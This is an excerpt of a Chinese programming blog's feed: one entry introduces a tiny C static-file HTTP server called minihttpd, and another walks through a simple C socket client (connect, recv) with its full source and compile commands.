    <content type="html">&lt;h2 id=&quot;minhttpd&quot;&gt;&lt;a href=&quot;#minhttpd&quot; class=&quot;headerlink&quot; title=&quot;minhttpd&quot;&gt;&lt;/a&gt;minhttpd&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/binyanbin/minihttpd&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;minihttpd&lt;/a&gt;一个超小型静态资源http服务器,,去掉注释及空行的剩余代码量小于300行。可支持windows和linux gcc编译。&lt;/p&gt;
&lt;h4 id=&quot;功能及目的&quot;&gt;&lt;a href=&quot;#功能及目的&quot; class=&quot;headerlink&quot; title=&quot;功能及目的&quot;&gt;&lt;/a&gt;功能及目的&lt;/h4&gt;&lt;p&gt;此服务的功能仅支持静态资源上传与下载，如图片,js,html,css等静态资源，以此作为单独静态资源服务器使用,使静态资源与web主服务器分离。这个服务也可以让你更了解http服务器的运作方式及基本原理,也是用纯C开发网络服务的一个示例。&lt;/p&gt;
&lt;h4 id=&quot;windwos-MinGW编译&quot;&gt;&lt;a href=&quot;#windwos-MinGW编译&quot; class=&quot;headerlink&quot; title=&quot;windwos MinGW编译:&quot;&gt;&lt;/a&gt;windwos MinGW编译:&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;gcc -o http http.c &lt;span class=&quot;_&quot;&gt;-l&lt;/span&gt; wsock32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;站点搭建&quot;&gt;&lt;a href=&quot;#站点搭建&quot; class=&quot;headerlink&quot; title=&quot;站点搭建&quot;&gt;&lt;/a&gt;站点搭建&lt;/h4&gt;&lt;p&gt;站点搭建:&lt;br&gt;创建站点目录，把http.exe复制到目录下，创建www目录并把网站的所有静态页面copy到目录下。&lt;br&gt;启动服务&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http 8080&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&quot;历史&quot;&gt;&lt;a href=&quot;#历史&quot; class=&quot;headerlink&quot; title=&quot;历史&quot;&gt;&lt;/a&gt;历史&lt;/h4&gt;&lt;p&gt;v0.1.0 第一个版本，支持动词get及html。 [2016-4-17]&lt;br&gt;v0.1.1 支持图片(最大为1m),css。[2016-5-4]&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/binyanbin/minihttpd&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;源码查看&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;minhttpd&quot;&gt;&lt;a href=&quot;#minhttpd&quot; class=&quot;headerlink&quot; title=&quot;minhttpd&quot;&gt;&lt;/a&gt;minhttpd&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/binyanbin/minihttp
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>C语言之socket 简易客户端</title>
    <link href="http://binyanbin.github.io/2016/04/13/c-6/"/>
    <id>http://binyanbin.github.io/2016/04/13/c-6/</id>
    <published>2016-04-12T16:00:00.000Z</published>
    <updated>2016-06-15T15:52:46.000Z</updated>
    
    <content type="html">&lt;p&gt;昨天做了一个简易服务端，今天尝试做一个简易客户端，东西比较少，很顺利就完成了。客户端socket操作步骤:1.创建socket 2.连接服务端 3.接收服务端返回数据&lt;/p&gt;
&lt;h1 id=&quot;函数&quot;&gt;&lt;a href=&quot;#函数&quot; class=&quot;headerlink&quot; title=&quot;函数&quot;&gt;&lt;/a&gt;函数&lt;/h1&gt;&lt;p&gt;1.连接:&lt;br&gt;int connect(int fd, const struct sockaddr* addr, socklen_t address_len));&lt;br&gt;fd：套接字描述符。&lt;br&gt;addr：返回连接着的地址&lt;br&gt;address_len：确定address缓冲区的长度&lt;br&gt;返回值：如果函数执行成功，返回值为0，否则为-1。&lt;/p&gt;
&lt;p&gt;2.接收&lt;br&gt;int recv(SOCKET socket, char FAR* buf, int len, int flags);&lt;br&gt;socket：一个标识已连接套接口的描述字。&lt;br&gt;buf：用于接收数据的缓冲区。&lt;br&gt;len：缓冲区长度。&lt;br&gt;flags：指定调用方式。&lt;br&gt;返回值：若无错误发生,recv()返回读入的字节数.如果连接已中止，返回0.否则的话,返回SOCKET_ERROR错误.&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;服务端示例&quot;&gt;&lt;a href=&quot;#服务端示例&quot; class=&quot;headerlink&quot; title=&quot;服务端示例&quot;&gt;&lt;/a&gt;服务端示例&lt;/h1&gt;&lt;p&gt;新建client.c文件&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;88&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; MINGW32&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;ifdef&lt;/span&gt; MINGW32&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;winsock2.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;sys/socket.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;arpa/inet.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; MAXLINE 1024&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc,&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; **argv)&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; sockfd,n;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; receline[MAXLINE+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; sockaddr_in serveraddr;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//输入参数太少，退出&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(argc != &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Usage :%s IP_address\n&quot;&lt;/span&gt;, argv[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;ifdef&lt;/span&gt; MINGW32&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//Winsows下启用socket&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	WSADATA wsadata;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(WSAStartup(MAKEWORD(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;),&amp;amp;wsadata)==SOCKET_ERROR)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;WSAStartup() fail\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//建立socket&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;((sockfd=socket(AF_INET,SOCK_STREAM,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;))==&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;socket() fail\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//设置协议及Port&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;built_in&quot;&gt;memset&lt;/span&gt;(&amp;amp;serveraddr,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(serveraddr));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	serveraddr.sin_family = AF_INET;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	serveraddr.sin_port=htons(&lt;span class=&quot;number&quot;&gt;1024&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//设置IP&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	serveraddr.sin_addr.s_addr=inet_addr(argv[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//连接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(connect(sockfd,(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; sockaddr *)&amp;amp;serveraddr,&lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(serveraddr))==&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;connect() fail\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//读取数据并输入到标准输出&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;ifdef&lt;/span&gt; MINGW32&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;((n=recv(sockfd,receline,MAXLINE,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;))&amp;gt;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;((n=read(sockfd,receline,MAXLINE))&amp;gt;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		receline[n]=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;fputs&lt;/span&gt;(receline,&lt;span class=&quot;built_in&quot;&gt;stdout&lt;/span&gt;)==EOF)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;fputs() error\r\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//没有获取数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(n&amp;lt;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;read() fail\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;ifdef&lt;/span&gt; MINGW32&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//Winsows下关闭socket&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	closesocket(sockfd);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	WSACleanup();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;编译:gcc -g -o client client.c -l wsock32&lt;br&gt;执行:&lt;br&gt;服务端 server&lt;br&gt;客户端连接 client 127.0.0.1&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;昨天做了一个简易服务端，今天尝试做一个简易客户端，东西比较少，很顺利就完成了。客户端socket操作步骤:1.创建socket 2.连接服务端 3.接收服务端返回数据&lt;/p&gt;
&lt;h1 id=&quot;函数&quot;&gt;&lt;a href=&quot;#函数&quot; class=&quot;headerlink&quot; title=&quot;函数&quot;&gt;&lt;/a&gt;函数&lt;/h1&gt;&lt;p&gt;1.连接:&lt;br&gt;int connect(int fd, const struct sockaddr* addr, socklen_t address_len));&lt;br&gt;fd：套接字描述符。&lt;br&gt;addr：返回连接着的地址&lt;br&gt;address_len：确定address缓冲区的长度&lt;br&gt;返回值：如果函数执行成功，返回值为0，否则为-1。&lt;/p&gt;
